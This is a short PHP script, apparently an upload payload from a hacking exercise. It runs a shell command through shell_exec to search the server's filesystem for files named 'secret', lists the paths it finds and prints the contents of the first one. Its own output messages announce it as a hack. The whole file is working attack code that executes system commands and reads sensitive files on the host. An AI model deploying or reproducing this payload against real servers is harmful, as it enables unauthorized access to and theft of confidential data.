<?php
    echo "Hacking starting...";
    $target = shell_exec('locate -i secret');
    $results= explode("\n", $target );
    echo '<pre>'; print_r($results); echo '</pre>';
    echo "Located secrets...";
    echo '<pre>'; echo file_get_contents( "$results[0]" ); echo '</pre>';
    echo "Hacked successfully!";
?>
